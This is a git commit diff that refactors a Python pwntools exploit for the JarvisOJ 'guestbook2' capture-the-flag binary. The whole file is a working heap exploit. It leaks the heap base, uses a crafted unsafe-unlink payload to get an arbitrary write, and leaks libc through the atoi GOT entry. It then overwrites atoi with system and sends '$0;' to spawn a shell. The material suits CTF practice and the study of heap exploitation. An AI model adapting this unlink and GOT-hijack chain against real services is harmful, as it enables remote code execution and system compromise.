5b5c526257f57468bc9359b4689099ac7b0367e6
bash-c <aboultraman@gmail.com>
2018-09-19 01:01:52 +0800

    unlink

--- jarvisOJ_Guestbook2/exp.py
+++ jarvisOJ_Guestbook2/exp.py
@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
 
 from pwn import *
 from time import sleep
@@ -17,37 +16,37 @@ else:
     elf = ELF("./guestbook2")
     libc = ELF("./libc.so.6")
 
-def listPost():
+def show():
     io.sendlineafter("choice: ", "1")
     
-def newPost(content):
+def add(content):
     io.sendlineafter("choice: ", "2")
     io.sendlineafter("post: ", str(len(content)))
     io.sendafter("post: ", content)
 
-def editNote(idx, content):
+def edit(idx, content):
     io.sendlineafter("choice: ", "3")
     io.sendlineafter("number: ", str(idx))
     io.sendlineafter("post: ", str(len(content)))
     io.sendafter("post: ", content)
 
-def delPost(idx):
+def delete(idx):
     io.sendlineafter("choice: ", "4")
     io.sendlineafter("number: ", str(idx))
 
 if __name__ == "__main__":
     ptr = 0x6020A8
     for i in xrange(5):
-        newPost(str(i) * 0x80)
+        add(str(i) * 0x80)
 
-    delPost(3)
-    delPost(1)
+    delete(3)
+    delete(1)
 
     payload = '0' * 0x80 + 'a' * 0x10
-    editNote(0, payload)
+    edit(0, payload)
 
     success("Step 1: leak heapBase")
-    listPost()
+    show()
     io.recvuntil("a" * 0x10)
     heapBase = u64(io.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - 0x19d0 # 0x1810 + 3 * 0x90 + 0x10
     info("heapBase -> 0x%x" % heapBase)
@@ -58,26 +57,25 @@ if __name__ == "__main__":
     success("Step 2: unlink")
     payload = p64(0x90) + p64(0x80) + p64(chunk0Addr - 0x18) + p64(chunk0Addr - 0x10) + '0' * (0x80 - 8 * 4)
     payload += p64(0x80) + p64(0x90 + 0x90) + '1' * 0x70
-    editNote(0, payload)
-    delPost(1)
+    edit(0, payload)
+    delete(1)
     pause()
 
-    success("Step 3: leak libcBase")
+    success("Step 3: leak libc")
     payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0Addr - 0x18)
     payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
     payload = payload.ljust(0x100, '\x00')
-    editNote(0, payload)
-    listPost()
+    edit(0, payload)
+    show()
     io.recvuntil("0. ")
     io.recvuntil("1. ")
-    libcBace = u64(io.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.symbols["atoi"]
-    info("libcBace -> 0x%x" % libcBace)
-    systemAddr = libcBace + libc.symbols["system"]
+    libc.address = u64(io.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.symbols["atoi"]
+    info("libc -> 0x%x" % libc.address)
     pause()
 
     success("Step 4: hijack & get shell")
-    editNote(1, p64(systemAddr))
-    io.sendlineafter("choice: ", "$0")
+    edit(1, p64(libc.sym['system']))
+    io.sendlineafter("choice: ", "$0;")
 
     io.interactive()
     io.close()
